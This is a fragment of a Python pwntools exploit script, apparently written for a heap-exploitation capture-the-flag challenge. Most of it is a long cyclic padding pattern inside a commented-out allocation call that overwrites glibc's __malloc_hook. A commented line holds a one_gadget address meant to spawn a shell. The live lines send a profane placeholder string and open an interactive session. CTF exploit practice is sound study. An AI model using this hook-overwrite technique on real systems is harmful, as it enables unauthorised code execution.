# add(3, 0x4100, b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaftaaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaagdaaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaagmaaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaagvaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaahfaaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaahoaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaahxaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaaihaaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaaiqaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaaizaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaajjaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaajsaaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaajzaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaakuaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaaleaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaalnaaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaalwaaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaamgaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaaaaamnaaaaaamoaaaaaampaaaaaamqaaaaaamraaaaaamsaaaaaamtaaaaaamuaaaaaamvaaaaaamwaaaaaamxaaaaaamyaaaaaamzaaaaaanbaaaaaancaaaaaandaaaaaaneaaaaaanfaaaaaangaaaaaanhaaaaaaniaaaaaanjaaaaaankaaaaaanlaaaaaanmaaaaaannaaaaaanoaaaaaanpaaaaaanqaaaaaanraaaaaansaaaaaantaaaaaanuaaaaaanvaaaaaanwaaaaaanxaaaaaanyaaaaaanzaaaaaaobaaaaaaocaaaaaaodaaaaaaoeaaaaaaofaaaaaaogaaaaaaohaaaaaaoiaaaaaaojaaaaaaokaaaaaaolaaaaaaomaaaaaaonaaaaaaooaaaaaaopaaaaaaoqaaaaaaoraaaaaaosaaaaaaotaaaaaaouaaaaaaovaaaaaaowaaaaaaoxaaaaaaoyaaaaaaozaaaaaapbaaaaaapcaaaaaapdaaaaaapeaaaaaapfaaaaaapgaaaaaaphaaaaaapiaaaaaapjaaaaaapkaaaaaaplaaaaaapmaaaaaapnaaaaaapoaaaaaappaaaaaapqaaaaaapraaaaaapsaaaaaaptaaaaaapuaaaaaapvaaaaaapwaaaaaapxaaaaaapyaaaaaapzaaaaaaqbaaaaaaqcaaaaaaqdaaaaaaqeaaaaaaqfaaaaaaqgaaaaaaqhaaaaaaqiaaaaaaqjaaaaaaqkaaaaaaqlaaaaaaqmaaaaaaqnaaaaaaqoaaaaaaqpaaaaaaqqaaaaaaqraaaaaaqsaaaaaaqtaaaaaaquaaaaaaqvaaaaaaqwaaaaaaqxaaaaaaqyaaaaaaqzaaaaaarbaaaaaarcaaaaaardaaaaaareaaaaaarfaaaaaargaaaaaarhaaaaaariaaaaaarjaaaaaarkaaaaaarlaaaaaarmaaaaaarnaaaaaaroaaaaaarpaaaaaarqaaaaaarraaaaaarsaaaaaartaaaaaaruaaaaaarvaaaaaarwaaaaaarxaaaaaaryaaaaaarzaaaaaasbaaaaaascaaaaaasdaaaaaaseaaaaaasfaaaaaasgaaaaaashaaaaaasiaaaaaasjaaaaaaskaaaaaaslaaaaaasmaaaaaasnaaaaaasoaaaaaaspaaaaaasqaaaaaasraaaaaassaaaaaastaaaaaasuaaaaaasvaaaaaaswaaaaaasxaaaaaasyaaaaaaszaaaaaatbaaaaaatcaaaaaatdaaaaaateaaaaaatfaaaaaatgaaaaaathaaaaaatiaaaaaatjaaaaaatkaaaaaatlaaaaaatmaaaaaatnaaaaaatoaaaaaatpaaaaaatqaaaaaatraaaaaatsaaaaaattaaaaaatuaaaaaatvaaaaaatwaaaaaatxaaaaaatyaaaaaatzaaaaaaubaaaaaaucaaaaaaudaaaaaaueaaaaaaufaaaaaaugaaaaaauhaaaaaauiaaaaaaujaaaaaaukaaaaaaulaaaaaaumaaaaaaunaaaaaauoaaaaaaupaaaaaauqaaaaaauraaaaaausaaaaaautaaaaaauuaaaaaauvaaaaaauwaaaaaauxaaaaaauyaaaaaauzaaaaaavbaaaaaavcaaaaaavdaaaaaaveaaaaaavfaaaaaavgaaaaaavhaaaaaaviaaaaaavjaaaaaavkaaaaaavlaaaaaavmaaaaaavnaaaaaavoaaaaaavpaaaaaavqaaaaaavraaaaaavsaaaaaavtaaaaaavuaaaaaavvaaaaaavwaaaaaavxaaaaaavyaaaaaavzaaaaaawbaaaaaawcaaaaaawdaaaaaaweaaaaaawfaaaaaawgaaaaaawhaaaaaawiaaaaaawjaaaaaawkaaaaaawlaaaaaawmaaaaaawnaaaaaawoaaaaaawpaaaaaawqaaaaaawraaaaaawsaaaaaawtaaaaaawuaaaaaawvaaaaaawwaaaaaawxaaaaaawyaaaaaawzaaaaaaxbaaaaaaxcaaaaaaxdaaaaaaxeaaaaaaxfaaaaaaxgaaaaaaxhaaaaaaxiaaaaaaxjaaaaaaxkaaaaaaxlaaaaaaxmaaaaaaxnaaaaaaxoaaaaaaxpaaaaaaxqaaaaaaxraaaaaaxsaaaaaaxtaaaaaaxuaaaaaaxvaaaaaaxwaaaaaaxxaaaaaaxyaaaaaaxzaaaaaaybaaaaaaycaaaaaaydaaaaaayeaaaaaayfaaaaaaygaaaaaayhaaaaaayiaaaaaayjaaaaaaykaaaaaaylaaaaaaymaaaaaaynaaaaaayoaaaaaaypaaaaaayqaaaaaayraaaaaaysaaaaaaytaaaaaayuaaaaaayvaaaaaaywaaaaaayxaaaaaayyaaaaaayzaaaaaazbaaaaaazcaaaaaazdaaaaaazeaaaaaazfaaaaaazgaaaaaazhaaaaaaziaaaaaazjaaaaaazkaaaaaazlaaaaaazmaaaaaaznaaaaaazoaaaaaazpaaaaaazqaaaaaazraaaaaazsaaaaaaztaaaaaazuaaaaaazvaaaaaazwaaaaaazxaaaaaazyaaaaaazzaaaaababaaaaabacaaaaabadaaaaabaeaaaaabafaaaaabagaaaaabahaaaaabaiaaaaabajaaaaabakaaaaabalaaaaabamaaaaabanaaaaabaoaaaaabapaaaaabaqaaaaabaraaaaabasaaaaabataaaaabauaaaaabavaaaaabawaaaaabaxaaaaabayaaaaabazaaaaabbbaaaaabbcaaaaabbdaaaaabbeaaaaabbfaaaaabbgaaaaabbhaaaaabbiaaaaabbjaaaaabbkaaaaabblaaaaabbmaaaaabbnaaaaabboaaaaabbpaaaaabbqaaaaabbraaaaabbsaaaaabbtaaaaabbuaaaaabbvaaaaabbwaaaaabbxaaaaabbyaaaaabbzaaaaabcbaaaaabccaaaaabcdaaaaabceaaaaabcfaaaaabcgaaaaabchaaaaabciaaaaabcjaaaaabckaaaaabclaaaaabcmaaaaabcnaaaaabcoaaaaabcpaaaaabcqaaaaabcraaaaabcsaaaaabctaaaaabcuaaaaabcvaaaaabcwaaaaabcxaaaaabcyaaaaabczaaaaabdbaaaaabdcaaaaabddaaaaabdeaaaaabdfaaaaabdgaaaaabdhaaaaabdiaaaaabdjaaaaabdkaaaaabdlaaaaabdmaaaaabdnaaaaabdoaaaaabdpaaaaabdqaaaaabdraaaaabdsaaaaabdtaaaaabduaaaaabdvaaaaabdwaaaaabdxaaaaabdyaaaaabdzaaaaabebaaaaabecaaaaabedaaaaabeeaaaaabefaaaaabegaaaaabehaaaaabeiaaaaabejaaaaabekaaaaabelaaaaabemaaaaabenaaaaabeoaaaaabepaaaaabeqaaaaaberaaaaabesaaaaabetaaaaabeuaaaaabevaaaaabewaaaaabexaaaaabeyaaaaabezaaaaabfbaaaaabfcaaaaabfdaaaaabfeaaaaabffaaaaabfgaaaaabfhaaaaabfiaaaaabfjaaaaabfkaaaaabflaaaaabfmaaaaabfnaaaaabfoaaaaabfpaaaaabfqaaaaabfraaaaabfsaaaaabftaaaaabfuaaaaabfvaaaaabfwaaaaabfxaaaaabfyaaaaabfzaaaaabgbaaaaabgcaaaaabgdaaaaabgeaaaaabgfaaaaabggaaaaabghaaaaabgiaaaaabgjaaaaabgkaaaaabglaaaaabgmaaaaabgnaaaaabgoaaaaabgpaaaaabgqaaaaabgraaaaabgsaaaaabgtaaaaabguaaaaabgvaaaaabgwaaaaabgxaaaaabgyaaaaabgzaaaaabhbaaaaabhcaaaaabhdaaaaabheaaaaabhfaaaaabhgaaaaabhhaaaaabhiaaaaabhjaaaaabhkaaaaabhlaaaaabhmaaaaabhnaaaaabhoaaaaabhpaaaaabhqaaaaabhraaaaabhsaaaaabhtaaaaabhuaaaaabhvaaaaabhwaaaaabhxaaaaabhyaaaaabhzaaaaabibaaaaabicaaaaabidaaaaabieaaaaabifaaaaabigaaaaabihaaaaabiiaaaaabijaaaaabikaaaaabilaaaaabimaaaaabinaaaaabioaaaaabipaaaaabiqaaaaabiraaaaabisaaaaabitaaaaabiuaaaaabivaaaaabiwaaaaabixaaaaabiyaaaaabizaaaaabjbaaaaabjcaaaaabjdaaaaabjeaaaaabjfaaaaabjgaaaaabjhaaaaabjiaaaaabjjaaaaabjkaaaaabjlaaaaabjmaaaaabjnaaaaabjoaaaaabjpaaaaabjqaaaaabjraaaaabjsaaaaabjtaaaaabjuaaaaabjvaaaaabjwaaaaabjxaaaaabjyaaaaabjzaaaaabkbaaaaabkcaaaaabkdaaaaabkeaaaaabkfaaaaabkgaaaaabkhaaaaabkiaaaaabkjaaaaabkkaaaaabklaaaaabkmaaaaabknaaaaabkoaaaaabkpaaaaabkqaaaaabkraaaaabksaaaaabktaaaaabkuaaaaabkvaaaaabkwaaaaabkxaaaaabkyaaaaabkzaaaaablbaaaaablcaaaaabldaaaaableaaaaablfaaaaablgaaaaablhaaaaabliaaaaabljaaaaablkaaaaabllaaaaablmaaaaablnaaaaabloaaaaablpaaaaablqaaaaablraaaaablsaaaaabltaaaaabluaaaaablvaaaaablwaaaaablxaaaaablyaaaaablzaaaaabmbaaaaabmcaaaaabmdaaaaabmeaaaaabmfaaaaabmgaaaaabmhaaaaabmiaaaaabmjaaaaabmkaaaaabmlaaaaabmmaaaaabmnaaaaabmoaaaaabmpaaaaabmqaaaaabmraaaaabmsaaaaabmtaaaaabmuaaaaabmvaaaaabmwaaaaabmxaaaaabmyaaaaabmzaaaaabnbaaaaabncaaaaabndaaaaabneaaaaabnfaaaaabngaaaaabnhaaaaabniaaaaabnjaaaaabnkaaaaabnlaaaaabnmaaaaabnnaaaaabnoaaaaabnpaaaaabnqaaaaabnraaaaabnsaaaaabntaaaaabnuaaaaabnvaaaaabnwaaaaabnxaaaaabnyaaaaabnzaaaaabobaaaaabocaaaaabodaaaaaboeaaaaabofaaaaabogaaaaabohaaaaaboiaaaaabojaaaaabokaaaaabolaaaaabomaaaaabonaaaaabooaaaaabopaaaaaboqaaaaaboraaaaabosaaaaabotaaaaabouaaaaabovaaaaabowaaaaaboxaaaaaboyaaaaabozaaaaabpbaaaaabpcaaaaabpdaaaaabpeaaaaabpfaaaaabpgaaaaabphaaaaabpiaaaaabpjaaaaabpkaaaaabplaaaaabpmaaaaabpnaaaaabpoaaaaabppaaaaabpqaaaaabpraaaaabpsaaaaabptaaaaabpuaaaaabpvaaaaabpwaaaaabpxaaaaabpyaaaaabpzaaaaabqbaaaaabqcaaaaabqdaaaaabqeaaaaabqfaaaaabqgaaaaabqhaaaaabqiaaaaabqjaaaaabqkaaaaabqlaaaaabqmaaaaabqnaaaaabqoaaaaabqpaaaaabqqaaaaabqraaaaabqsaaaaabqtaaaaabquaaaaabqvaaaaabqwaaaaabqxaaaaabqyaaaaabqzaaaaabrbaaaaabrcaaaaabrdaaaaabreaaaaabrfaaaaabrgaaaaabrhaaaaabriaaaaabrjaaaaabrkaaaaabrlaaaaabrmaaaaabrnaaaaabroaaaaabrpaaaaabrqaaaaabrraaaaabrsaaaaabrtaaaaabruaaaaabrvaaaaabrwaaaaabrxaaaaabryaaaaabrzaaaaabsbaaaaabscaaaaabsdaaaaabseaaaaabsfaaaaabsgaaaaabshaaaaabsiaaaaabsjaaaaabskaaaaabslaaaaabsmaaaaabsnaaaaabsoaaaaabspaaaaabsqaaaaabsraaaaabssaaaaabstaaaaabsuaaaaabsvaaaaabswaaaaabsxaaaaabsyaaaaabszaaaaabtbaaaaabtcaaaaabtdaaaaabteaaaaabtfaaaaabtgaaaaabthaaaaabtiaaaaabtjaaaaabtkaaaaabtlaaaaabtmaaaaabtnaaaaabtoaaaaabtpaaaaabtqaaaaabtraaaaabtsaaaaabttaaaaabtuaaaaabtvaaaaabtwaaaaabtxaaaaabtyaaaaabtzaaaaabubaaaaabucaaaaabudaaaaabueaaaaabufaaaaabugaaaaabuhaaaaabuiaaaaabujaaaaabukaaaaabulaaaaabumaaaaabunaaaaabuoaaaaabupaaaaabuqaaaaaburaaaaabusaaaaabutaaaaabuuaaaaabuvaaaaabuwaaaaabuxaaaaabuyaaaaabuzaaaaabvbaaaaabvcaaaaabvdaaaaabveaaaaabvfaaaaabvgaaaaabvhaaaaabviaaaaabvjaaaaabvkaaaaabvlaaaaabvmaaaaabvnaaaaabvoaaaaabvpaaaaabvqaaaaabvraaaaabvsaaaaabvtaaaaabvuaaaaabvvaaaaabvwaaaaabvxaaaaabvyaaaaabvzaaaaabwbaaaaabwcaaaaabwdaaaaabweaaaaabwfaaaaabwgaaaaabwhaaaaabwiaaaaabwjaaaaabwkaaaaabwlaaaaabwmaaaaabwnaaaaabwoaaaaabwpaaaaabwqaaaaabwraaaaabwsaaaaabwtaaaaabwuaaaaabwvaaaaabwwaaaaabwxaaaaabwyaaaaabwzaaaaabxbaaaaabxcaaaaabxdaaaaabxeaaaaabxfaaaaabxgaaaaabxhaaaaabxiaaaaabxjaaaaabxkaaaaabxlaaaaabxmaaaaabxnaaaaabxoaaaaabxpaaaaabxqaaaaabxraaaaabxsaaaaabxtaaaaabxuaaaaabxvaaaaabxwaaaaabxxaaaaabxyaaaaabxzaaaaabybaaaaabycaaaaabydaaaaabyeaaaaabyfaaaaabygaaaaabyhaaaaabyiaaaaabyjaaaaabykaaaaabylaaaaabymaaaaabynaaaaabyoaaaaabypaaaaabyqaaaaabyraaaaabysaaaaabytaaaaabyuaaaaabyvaaaaabywaaaaabyxaaaaabyyaaaaabyzaaaaabzbaaaaabzcaaaaabzdaaaaabzeaaaaabzfaaaaabzgaaaaabzhaaaaabziaaaaabzjaaaaabzkaaaaabzlaaaaabzmaaaaabznaaaaabzoaaaaabzpaaaaabzqaaaaabzraaaaabzsaaaaabztaaaaabzuaaaaabzvaaaaabzwaaaaabzxaaaaabzyaaaaabzzaaaaacabaaaaacacaaaaacadaaaaacaeaaaaacafaaaaacagaaaaacahaaaaacaiaaaaacajaaaaacakaaaaacalaaaaacamaaaaacanaaaaacaoaaaaacapaaaaacaqaaaaacaraaaaacasaaaaacataaaaacauaaaaacavaaaaacawaaaaacaxaaaaacayaaaaacazaaaaacbbaaaaacbcaaaaacbdaaaaacbeaaaaacbfaaaaacbgaaaaacbhaaaaacbiaaaaacbjaaaaacbkaaaaacblaaaaacbmaaaaacbnaaaaacboaaaaacbpaaaaacbqaaaaacbraaaaacbsaaaaacbtaaaaacbuaaaaacbvaaaaacbwaaaaacbxaaaaacbyaaaaacbzaaaaaccbaaaaacccaaaaaccdaaaaacceaaaaaccfaaaaaccgaaaaacchaaaaacciaaaaaccjaaaaacckaaaaacclaaaaaccmaaaaaccnaaaaaccoaaaaaccpaaaaaccqaaaaaccraaaaaccsaaaaacctaaaaaccuaaaaaccvaaaaaccwaaaaaccxaaaaaccyaaaaacczaaaaacdbaaaaacdcaaaaacddaaaaacdeaaaaacdfaaaaacdgaaaaacdhaaaaacdiaaaaacdjaaaaacdkaaaaacdlaaaaacdmaaaaacdnaaaaacdoaaaaacdpaaaaacdqaaaaacdraaaaacdsaaaaacdtaaaaacduaaaaacdvaaaaacdwaaaaacdxaaaaacdyaaaaacdzaaaaacebaaaaacecaaaaacedaaaaaceeaaaaacefaaaaacegaaaaacehaaaaaceiaaaaacejaaaaacekaaaaacelaaaaacemaaaaacenaaaaaceoaaaaacepaaaaaceqaaaaaceraaaaacesaaaaacetaaaaaceuaaaaacevaaaaacewaaaaacexaaaaaceyaaaaacezaaaaacfbaaaaacfcaaaaacfdaaaaacfeaaaaacffaaaaacfgaaaaacfhaaaaacfiaaaaacfjaaaaacfkaaaaacflaaaaacfmaaaaacfnaaaaacfoaaaaacfpaaaaacfqaaaaacfraaaaacfsaaaaacftaaaaacfuaaaaacfvaaaaacfwaaaaacfxaaaaacfyaaaaacfzaaaaacgbaaaaacgcaaaaacgdaaaaacgeaaaaacgfaaaaacggaaaaacghaaaaacgiaaaaacgjaaaaacgkaaaaacglaaaaacgmaaaaacgnaaaaacgoaaaaacgpaaaaacgqaaaaacgraaaaacgsaaaaacgtaaaaacguaaaaacgvaaaaacgwaaaaacgxaaaaacgyaaaaacgzaaaaachbaaaaachcaaaaachdaaaaacheaaaaachfaaaaachgaaaaachhaaaaachiaaaaachjaaaaachkaaaaachlaaaaachmaaaaachnaaaaachoaaaaachpaaaaachqaaaaachraaaaachsaaaaachtaaaaachuaaaaachvaaaaachwaaaaachxaaaaachyaaaaachzaaaaacibaaaaacicaaaaacidaaaaacieaaaaacifaaaaacigaaaaacihaaaaaciiaaaaacijaaaaacikaaaaacilaaaaacimaaaaacinaaaaacioaaaaacipaaaaaciqaaaaaciraaaaacisaaaaacitaaaaaciuaaaaacivaaaaaci" + p64(libc.sym['__malloc_hook']) + b"\x00"*4456)
# add(11, 30, p64(libc.address + 0xe6c7e))
add(11, 30, "FUCKFUCK")
# add(7, 0x30-2, "A"*8)
# add(8, 0x30-2, "A"*8)
# for i in range(9):
#     delete(i)
# delete(7)
# show(2)

io.interactive()
